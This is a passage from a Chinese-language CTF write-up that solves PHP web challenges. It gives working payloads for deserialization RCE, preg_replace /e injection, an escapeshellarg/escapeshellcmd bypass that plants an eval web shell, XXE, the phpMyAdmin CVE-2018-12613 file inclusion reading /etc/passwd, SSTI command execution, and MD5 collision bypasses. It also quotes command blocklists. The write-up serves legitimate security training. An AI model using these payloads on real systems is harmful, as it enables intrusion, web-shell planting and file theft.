\u0026#34;Sorry, we currently only support woofers and meowers.\u0026#34;; } } ?\u0026gt; 1 category=woofers/../flag 尝试目录穿越，直接读取不了flag\n这里用到伪协议可以套一层协议\n1 category=php://filter/convert.base64-encode/index/resource=flag [网鼎杯 2020 朱雀组]phpweb 界面一直在自己刷新我们抓包看看\n可能是func参数为函数然后p为函数值，我们先查看index.php，用file_get_contents,highlight_file() ，show_source()都行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php $disable_fun = array(\u0026#34;exec\u0026#34;,\u0026#34;shell_exec\u0026#34;,\u0026#34;system\u0026#34;,\u0026#34;passthru\u0026#34;,\u0026#34;proc_open\u0026#34;,\u0026#34;show_source\u0026#34;,\u0026#34;phpinfo\u0026#34;,\u0026#34;popen\u0026#34;,\u0026#34;dl\u0026#34;,\u0026#34;eval\u0026#34;,\u0026#34;proc_terminate\u0026#34;,\u0026#34;touch\u0026#34;,\u0026#34;escapeshellcmd\u0026#34;,\u0026#34;escapeshellarg\u0026#34;,\u0026#34;assert\u0026#34;,\u0026#34;substr_replace\u0026#34;,\u0026#34;call_user_func_array\u0026#34;,\u0026#34;call_user_func\u0026#34;,\u0026#34;array_filter\u0026#34;, \u0026#34;array_walk\u0026#34;, \u0026#34;array_map\u0026#34;,\u0026#34;registregister_shutdown_function\u0026#34;,\u0026#34;register_tick_function\u0026#34;,\u0026#34;filter_var\u0026#34;, \u0026#34;filter_var_array\u0026#34;, \u0026#34;uasort\u0026#34;, \u0026#34;uksort\u0026#34;, \u0026#34;array_reduce\u0026#34;,\u0026#34;array_walk\u0026#34;, \u0026#34;array_walk_recursive\u0026#34;,\u0026#34;pcntl_exec\u0026#34;,\u0026#34;fopen\u0026#34;,\u0026#34;fwrite\u0026#34;,\u0026#34;file_put_contents\u0026#34;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == \u0026#34;string\u0026#34;) { return $result; } else {return \u0026#34;\u0026#34;;} } class Test { var $p = \u0026#34;Y-m-d h:i:s a\u0026#34;; var $func = \u0026#34;date\u0026#34;; function __destruct() { if ($this-\u0026gt;func != \u0026#34;\u0026#34;) { echo gettime($this-\u0026gt;func, $this-\u0026gt;p); } } } $func = $_REQUEST[\u0026#34;func\u0026#34;]; $p = $_REQUEST[\u0026#34;p\u0026#34;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\u0026#34;Hacker...\u0026#34;); } } ?\u0026gt; 1 2 3 4 5 6 7 8 9 class Test { var $p = \u0026#34;Y-m-d h:i:s a\u0026#34;; var $func = \u0026#34;date\u0026#34;; function __destruct() { if ($this-\u0026gt;func != \u0026#34;\u0026#34;) { echo gettime($this-\u0026gt;func, $this-\u0026gt;p); } } } 这里可以利用反序列化，来rce，因为gettime函数本质是call_user_func函数，可以rce\n1 2 3 4 5 6 7 8 \u0026lt;?php class Test { var $p = \u0026#34;ls\u0026#34;; var $func = \u0026#34;system\u0026#34;; } $obj = new Test(); echo serialize($obj); ?\u0026gt; 然后前面func传unserialize函数\n都没有我们直接find查找\n或者\n1 2 func=readfile\u0026amp;p=/tmp/flagoefiu4r93 func=unserialize\u0026amp;p=O:4:\u0026#34;Test\u0026#34;:2:{s:1:\u0026#34;p\u0026#34;;s:25:\u0026#34;cat $(find / -name flag*)\u0026#34;;s:4:\u0026#34;func\u0026#34;;s:6:\u0026#34;system\u0026#34;;} 这里好像还有非预期\n\\号后面的命令不会被识别\n1 2 func=\\system\u0026amp;p=find / -name flag* func=\\system\u0026amp;p=cat /tmp/flagoefiu4r93 [BJDCTF2020]The mystery of ip smarty注入\n[BJDCTF2020]ZJCTF，不过如此 读取next.php内容\n下面post传i have a dream\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php $id = $_GET[\u0026#39;id\u0026#39;]; $_SESSION[\u0026#39;id\u0026#39;] = $id; function complex($re, $str) { return preg_replace( \u0026#39;/(\u0026#39; . $re . \u0026#39;)/ei\u0026#39;, \u0026#39;strtolower(\u0026#34;\\\\1\u0026#34;)\u0026#39;, $str ); } foreach($_GET as $re =\u0026gt; $str) { echo complex($re, $str). \u0026#34;\\n\u0026#34;; } function getFlag(){ @eval($_GET[\u0026#39;cmd\u0026#39;]); } 这里发现preg_replace用了/e参数，是存在rce漏洞的\n但是这里的第二个参数固定了，接下来引用这篇：文章 - 深入研究preg_replace与代码执行 - 先知社区\n1 2 3 反向引用 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 \u0026#39;\\n\u0026#39; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 所以这里的 \\1 实际上指定的是第一个子匹配项，然后原来第三个参数输入命令，就会变成第二个，原来的第一个参数写入模糊匹配.*就会匹配现在的第一个参数\\1，然后就会触发/e参数漏洞\n但是.*在php里面，对于传入的非法的 $_GET 数组参数名，会将其转换成下划线，我们改为S*\n最终payload\n1 2 \\S*=${getFlag()}\u0026amp;cmd=system(\u0026#39;ls /\u0026#39;) \\S*=${getFlag()}\u0026amp;cmd=system(\u0026#39;cat /flag\u0026#39;) 这里用${}包裹函数，是php可变变量的原因：PHP: 可变变量 - Manual\n在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 ${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1} (phpinfo()成功执行返回true)\n[BUUCTF 2018]Online Tool 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } if(!isset($_GET[\u0026#39;host\u0026#39;])) { highlight_file(__FILE__); } else { $host = $_GET[\u0026#39;host\u0026#39;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\u0026#34;glzjin\u0026#34;. $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); echo \u0026#39;you are in sandbox \u0026#39;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\u0026#34;nmap -T5 -sT -Pn --host-timeout 2 -F \u0026#34;.$host); } 这里escapeshellarg和escapeshellcmd函数按这样顺序调用有个漏洞\n参考：PHP escapeshellarg()+escapeshellcmd() 之殇\n1 2 3 4 传入的参数是：172.17.0.2\u0026#39; -v -d a=1 经过escapeshellarg处理后变成了\u0026#39;172.17.0.2\u0026#39;\\\u0026#39;\u0026#39; -v -d a=1\u0026#39;，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。 经过escapeshellcmd处理后变成\u0026#39;172.17.0.2\u0026#39;\\\\\u0026#39;\u0026#39; -v -d a=1\\\u0026#39;，这是因为escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php 最后执行的命令是curl \u0026#39;172.17.0.2\u0026#39;\\\\\u0026#39;\u0026#39; -v -d a=1\\\u0026#39;，由于中间的\\\\被解释为\\而不再是转义字符，所以后面的\u0026#39;没有被转义，与再后面的\u0026#39;配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\\ -v -d a=1\u0026#39;，即向172.17.0.2\\发起请求，POST 数据为a=1\u0026#39;。 然后我们只要把想要执行的语句用单引号括起来加空格就能绕过\n这里最后用nmap命令，nmap有一个参数-oG可以实现将命令和结果写到文件\n1 ?host=\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG shell.php \u0026#39; 然后蚁剑连接\n这里解释一下为什么加引号和空格\n如果后面没有加引号，在传文件之后，文件名后会多一个引号\n1 2 3 4 5 6 ?host=\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG test.php 因为先经过escapeshellarg()这个函数处理，先会对前面的单引号进行转义，然后再把前面和后面的内容用单引号括起来连接，因为原本这个单引号前面没有内容，所以前面只会多一对单引号 ?host=\u0026#39;\u0026#39;\\\u0026#39;\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG test.php\u0026#39; 然后再经escapeshellcmd()函数处理,escapeshellcmd对\\以及最后那个不配对儿的引号进行了转义,还会对这些字符进行转义： ?host=\u0026#39;\u0026#39;\\\\\u0026#39;\u0026#39; \\\u0026lt;\\?php @eval\\($_POST\\[\u0026#34;cmd\u0026#34;\\]\\)\\;\\?\\\u0026gt; -oG test.php\\\u0026#39; 所以最后会多一个单引号 但如果加了引号，但是最后一个引号前面没有加空格，那样文件名后面会多双斜杠\n1 2 ?host=\u0026#39; \u0026lt;?php @eval($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt; -oG test.php\u0026#39; \u0026#39;\u0026#39;\\\\\u0026#39;\u0026#39; \\\u0026lt;\\?\\php @eval\\($_POST\\[\u0026#34;cmd\u0026#34;\\]\\)\\;\\?\\\u0026gt; -oG test.php\u0026#39;\\\\\u0026#39;\u0026#39;\u0026#39; 空格作用就是把文件名后面的双斜杠隔开\n[GXYCTF2019]禁止套娃 目录扫描发现.git后面目录有东西，怀疑git源码泄露\ngithack下载源码\n下载了index.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php include \u0026#34;flag.php\u0026#34;; echo \u0026#34;flag在哪里呢？\u0026lt;br\u0026gt;\u0026#34;; if(isset($_GET[\u0026#39;exp\u0026#39;])){ if (!preg_match(\u0026#39;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { if(\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[a-z,_]+\\((?R)?\\)/\u0026#39;, NULL, $_GET[\u0026#39;exp\u0026#39;])) { if (!preg_match(\u0026#39;/et|na|info|dec|bin|hex|oct|pi|log/i\u0026#39;, $_GET[\u0026#39;exp\u0026#39;])) { // echo $_GET[\u0026#39;exp\u0026#39;]; @eval($_GET[\u0026#39;exp\u0026#39;]); } else{ die(\u0026#34;还差一点哦！\u0026#34;); } } else{ die(\u0026#34;再好好想想！\u0026#34;); } } else{ die(\u0026#34;还想读flag，臭弟弟！\u0026#34;); } } // highlight_file(__FILE__); ?\u0026gt; (?R)? : (?R)代表当前表达式，就是这个(/[a-z,_]+((?R)?)/)，所以会一直递归，?表示递归当前表达式0次或1（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）\n只能无参rce了\n构造payload\n1 2 3 4 5 6 7 exp=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名 next() 输出数组中的当前元素和下一个元素的值。 array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值) scandir() 函数返回指定目录中的文件和目录的数组。 pos() 输出数组中的当前元素的值。 localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是\u0026#34;.\u0026#34;。 loacleconv 函数会固定返回一个 . 然后pos将我们获得的 .返回到我们构造的 payload 使得 scandir能够返回当前目录下的数组（换句话说，就是读出当前目录下的文件）array_reverse()以相反的顺序输出（目的是以正序输出查询出来的内容）然后 next 提取第二个元素（将.过滤出去），最后用highlight_file()给显示出来。\n或者用session_id来获得flag\n1 ?exp=highlight_file(session_id(session_start())); 添加cookie的phpsessid值\n[NCTF2019]Fake XML cookbook xxe漏洞\n直接秒了\n1 2 3 4 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE ANY[ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt; ]\u0026gt; 下面username填\u0026amp;xxe;\n[GWCTF 2019]我有一个数据库 我目录扫描扫不出来只能看别人的了\n有个robots.txt\n没什么用\n但是也扫到phpmyadmin\n1 /phpmyadmin/index.php 版本为4.8.1，有有个cve漏洞\n漏洞复现：phpMyAdmin 4.8.1 远程文件包含 CVE-2018-12613 漏洞复现_phpmyadmin 4.8.1 远程文件包含漏洞(cve-2018-12613) phpmyadm-CSDN博客\n直接抄payload\n1 /phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd 有回显\n直接读flag\n1 /phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag [BJDCTF2020]Mark loves cat byd扫不出来没设timeout,可以把线程调低，但是太慢了，-t调线程\n1 python dirsearch.py -e * -u http://ebc4f861-217c-4e5b-8de7-510518bd30be.node5.buuoj.cn:81/ -t 1 --timeout=2 -x 429 存在git泄露，githack下载源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php include \u0026#39;flag.php\u0026#39;; $yds = \u0026#34;dog\u0026#34;; $is = \u0026#34;cat\u0026#34;; $handsome = \u0026#39;yds\u0026#39;; foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } foreach($_GET as $x =\u0026gt; $y){ if($_GET[\u0026#39;flag\u0026#39;] === $x \u0026amp;\u0026amp; $x !== \u0026#39;flag\u0026#39;){ exit($handsome); } } if(!isset($_GET[\u0026#39;flag\u0026#39;]) \u0026amp;\u0026amp; !isset($_POST[\u0026#39;flag\u0026#39;])){ exit($yds); } if($_POST[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39; || $_GET[\u0026#39;flag\u0026#39;] === \u0026#39;flag\u0026#39;){ exit($is); } echo \u0026#34;the flag is: \u0026#34;.$flag; 主要利用点在这里\n1 2 3 4 5 6 7 foreach($_POST as $x =\u0026gt; $y){ $$x = $y; } foreach($_GET as $x =\u0026gt; $y){ $$x = $$y; } 我们要求最后输出flag，要绕过三个if很困难，但是如果把exit里面的变量覆盖也能输出flag\n1 2 3 4 5 6 ?yds=flag 这里get传参 $x=yds;$y=flag $$x=$yds;$$y=$flag 满足第二个条件 这样exit就会返回$flag的值 1 2 ?is=flag\u0026amp;flag=flag 满足第三个条件 1 2 3 ?handsome=flag\u0026amp;flag=x\u0026amp;x=flag 这里因为get传参，$x=$flag,flag=x,满足第一个条件 或者直接?handsome=flag\u0026amp;flag=handsome [WUSTCTF2020]朴实无华 这里intval里面的数要小于2020但是+1之后要大于2021\n用到科学计数法，刚开始2e5会被解析成2，但是加一之后会被解析为20001，符合条件\n1 2 3 if (isset($_GET[\u0026#39;md5\u0026#39;])){ $md5=$_GET[\u0026#39;md5\u0026#39;]; if ($md5==md5($md5)) 要求跟原字符串相同的MD5\n只有0e215962017\n[BJDCTF2020]Cookie is so stable cookie有问题，结合这个比赛之前的题目怀疑ssti\n1 {{7*\u0026#39;7\u0026#39;}}回显49说明是twig模板注入 直接上payload\n1 {{_self.env.registerUndefinedFilterCallback(\u0026#34;exec\u0026#34;)}}{{_self.env.getFilter(\u0026#34;cat /flag\u0026#34;)}} [CISCN2019 华东南赛区]Web11 smarty注入\n直接xff头上{system(\u0026lsquo;cat /flag\u0026rsquo;)}\n[MRCTF2020]Ezpop 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-\u0026gt;append($this-\u0026gt;var); } } class Show{ public $source; public $str; public function __construct($file=\u0026#39;index.php\u0026#39;){ $this-\u0026gt;source = $file; echo \u0026#39;Welcome to \u0026#39;.$this-\u0026gt;source.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __toString(){ return $this-\u0026gt;str-\u0026gt;source; } public function __wakeup(){ if(preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test{ public $p; public function __construct(){ $this-\u0026gt;p = array(); } public function __get($key){ $function = $this-\u0026gt;p; return $function(); } } 先找入口__construct，发现__get()函数会返回一个函数可以触发__invoke方法，所以让p=new Modifier(),这里会调用append来读取var的值，我们var设置为伪协议读flag,还剩两个方法没被触发\n__tostring可以由show下面的__wakeup()里面的正则匹配会把source变字符串，所以可以让source=new Show(),触发之后会返回str-\u0026gt;source,这里如果将str传给__get(),由于会输出不存在的变量source成功触发\n所以完整的pop链\n1 new show触发__construct,然后source=new show触发__tostring,str=new test触发__get,p=new Modifier()触发__invoke,最后调用append输出flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 \u0026lt;?php class Modifier { protected $var=\u0026#39;php://filter/read=convert.base64-encode/resource=flag.php\u0026#39;; public function append($value){ include($value); } public function __invoke(){ $this-\u0026gt;append($this-\u0026gt;var); } } class Show{ public $source; public $str; public function __construct($file=\u0026#39;index.php\u0026#39;){ $this-\u0026gt;source = $file; echo \u0026#39;Welcome to \u0026#39;.$this-\u0026gt;source.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } public function __toString(){ return $this-\u0026gt;str-\u0026gt;source; } public function __wakeup(){ if(preg_match(\u0026#34;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test{ public $p; public function __construct(){ $this-\u0026gt;p = array(); } public function __get($key){ $function = $this-\u0026gt;p; return $function(); } } $a= new Modifier(); $b= new Show(); $c= new Test(); $b-\u0026gt;source=new Show(); $b-\u0026gt;source-\u0026gt;str=$c; $c-\u0026gt;p=$a; echo urlencode(serialize($b)); [安洵杯 2019]easy_web 图片url看起来是base64\n解码看看\n两次base64加一个hex转ascii\n构造index.php读取\n1 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;?php error_reporting(E_ALL || ~ E_NOTICE); header(\u0026#39;content-type:text/html;charset=utf-8\u0026#39;); $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!isset($_GET[\u0026#39;img\u0026#39;]) || !isset($_GET[\u0026#39;cmd\u0026#39;])) header(\u0026#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0\u0026amp;cmd=\u0026#39;); $file = hex2bin(base64_decode(base64_decode($_GET[\u0026#39;img\u0026#39;]))); $file = preg_replace(\u0026#34;/[^a-zA-Z0-9.]+/\u0026#34;, \u0026#34;\u0026#34;, $file); if (preg_match(\u0026#34;/flag/i\u0026#34;, $file)) { echo \u0026#39;\u0026lt;img src =\u0026#34;./ctf3.jpeg\u0026#34;\u0026gt;\u0026#39;; die(\u0026#34;xixi～ no flag\u0026#34;); } else { $txt = base64_encode(file_get_contents($file)); echo \u0026#34;\u0026lt;img src=\u0026#39;data:image/gif;base64,\u0026#34; . $txt . \u0026#34;\u0026#39;\u0026gt;\u0026lt;/img\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } echo $cmd; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; if (preg_match(\u0026#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\\u0026#39;|\\\u0026#34;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\\u0026amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|\u0026lt;|\u0026gt;/i\u0026#34;, $cmd)) { echo(\u0026#34;forbid ~\u0026#34;); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else { if ((string)$_POST[\u0026#39;a\u0026#39;] !== (string)$_POST[\u0026#39;b\u0026#39;] \u0026amp;\u0026amp; md5($_POST[\u0026#39;a\u0026#39;]) === md5($_POST[\u0026#39;b\u0026#39;])) { echo `$cmd`; } else { echo (\u0026#34;md5 is funny ~\u0026#34;); } } ?\u0026gt; 这里要md5强比较绕过只能找payload了\n1 2 3 4 a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2 \u0026amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 或者 a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2\u0026amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2 [MRCTF2020]PYWebsite [安洵杯 2019]easy_serialize_php 源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;?php $function = @$_GET[\u0026#39;f\u0026#39;]; function filter($img){ $filter_arr = array(\u0026#39;php\u0026#39;,\u0026#39;flag\u0026#39;,\u0026#39;php5\u0026#39;,\u0026#39;php4\u0026#39;,\u0026#39;fl1g\u0026#39;); $filter = \u0026#39;/\u0026#39;.implode(\u0026#39;|\u0026#39;,$filter_arr).\u0026#39;/i\u0026#39;; return preg_replace($filter,\u0026#39;\u0026#39;,$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[\u0026#34;user\u0026#34;] = \u0026#39;guest\u0026#39;; $_SESSION[\u0026#39;function\u0026#39;] = $function; extract($_POST); if(!$function){ echo \u0026#39;\u0026lt;a href=\u0026#34;index.php?f=highlight_file\u0026#34;\u0026gt;source_code\u0026lt;/a\u0026gt;\u0026#39;; } if(!$_GET[\u0026#39;img_path\u0026#39;]){ $_SESSION[\u0026#39;img\u0026#39;] = base64_encode(\u0026#39;guest_img.png\u0026#39;); }else{ $_SESSION[\u0026#39;img\u0026#39;] = sha1(base64_encode($_GET[\u0026#39;img_path\u0026#39;])); } $serialize_info = filter(serialize($_SESSION)); if($function == \u0026#39;highlight_file\u0026#39;){ highlight_file(\u0026#39;index.php\u0026#39;); }else if($function == \u0026#39;phpinfo\u0026#39;){ eval(\u0026#39;phpinfo();\u0026#39;); //maybe you can find something in here! }else if($function == \u0026#39;show_image\u0026#39;){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[\u0026#39;img\u0026#39;])); } 代码逻辑是extract传入变量，改变session[img]为固定值，序列化session然后过滤，反序列化，base64解码读取内容\n先看看phpinfo,找到d0g3_f1ag.php\nphp反序列化字符逃逸 在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，但如果我们在序列化字符串后加随机字符串\n1 2 3 4 \u0026lt;?php $str=\u0026#39;a:2:{i:0;s:8:\u0026#34;Hed9eh0g\u0026#34;;i:1;s:5:\u0026#34;aaaaa\u0026#34;;}abc\u0026#39;; var_dump(unserialize($str)); ?\u0026gt; 任然输出原来的结果,因为他读到}就停止了，不会读取}后的字符串\n1 2 3 4 5 6 7 8 \u0026lt;?php $_SESSION[\u0026#34;user\u0026#34;]=\u0026#39;flagflagflagflagflagflag\u0026#39;; $_SESSION[\u0026#34;function\u0026#34;]=\u0026#39;a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;}\u0026#39;; $_SESSION[\u0026#34;img\u0026#34;]=\u0026#39;L2QwZzNfZmxsbGxsbGFn\u0026#39;; echo serialize($_SESSION); ?\u0026gt; //a:3:{s:4:\u0026#34;user\u0026#34;;s:24:\u0026#34;flagflagflagflagflagflag\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:59:\u0026#34;a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;}\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;} 这里的function里面开头的\u0026quot;a是为了序列化之后跟前面的\u0026quot;拼接\n然后因为flag会被空替换，变成\n1 a:3:{s:4:\u0026#34;user\u0026#34;;s:24:\u0026#34;\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:59:\u0026#34;a\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;s:2:\u0026#34;dd\u0026#34;;s:1:\u0026#34;a\u0026#34;;}\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;} 本来由于有6个flag字符所以为24，现在这6个flag都被过滤了，那么它将会尝试向后读取24个字符看看是否满足序列化的规则，也即读取;s:8:\u0026quot;function\u0026quot;;s:59:\u0026quot;a,读取这24个字符后以\u0026quot;;结尾，恰好满足规则，而后第三个s向后读取img的20个字符，第四个、第五个s向后读取均满足规则\n最终结果为\n1 2 3 4 5 array(3) { [\u0026#34;user\u0026#34;]=\u0026gt; string(24) \u0026#34;\u0026#34;;s:8:\u0026#34;function\u0026#34;;s:59:\u0026#34;a\u0026#34; [\u0026#34;img\u0026#34;]=\u0026gt; string(20) \u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34; [\u0026#34;dd\u0026#34;]=\u0026gt; string(1) \u0026#34;a\u0026#34; } 这样就把原来不可变的Img给替换了\n然后我们传入一个session让他序列化就行了,有两种绕过办法，第一种让__SESSION[flagflag]传入开头为\u0026quot;的字符串，这样序列化，就会拼接为空造成上面的绕过（不知道为什么复现不了）\n1 2 3 4 5 $_SESSION[\u0026#39;flagflag\u0026#39;]=\u0026#39;\u0026#34;;s:3:\u0026#34;aaa\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;}\u0026#39;; #结果 a:1:{s:8:\u0026#34;flagflag\u0026#34;;s:51:\u0026#34;\u0026#34;;s:3:\u0026#34;aaa\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;}\u0026#34;;}，这里就造成img不成为一个键，也就无法进行加密 #过滤掉flag有 #a:1:{s:8:\u0026#34;\u0026#34;;s:51:\u0026#34;\u0026#34;;s:3:\u0026#34;aaa\u0026#34;;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;ZDBnM19mMWFnLnBocA==\u0026#34;;}\u0026#34;;} #使得绕过;s:51:\u0026#34;\u0026#34;到达下一个分号，这时img成功逃逸出来 第二种直接构造三个session,然后在第一个session的值传很多flag,过滤后就会匹配后面的session来替换img\n1 2 3 _SESSION[a]=phpflagflagflagflagflagflagflagflagflagflagflagflagflag\u0026amp;_SESSION[img]=1\u0026amp;_SESSION[exp]=;s:3:\u0026#34;img\u0026#34;;s:20:\u0026#34;L2QwZzNfZmxsbGxsbGFn\u0026#34;;i:0;i:1;} 序列化后 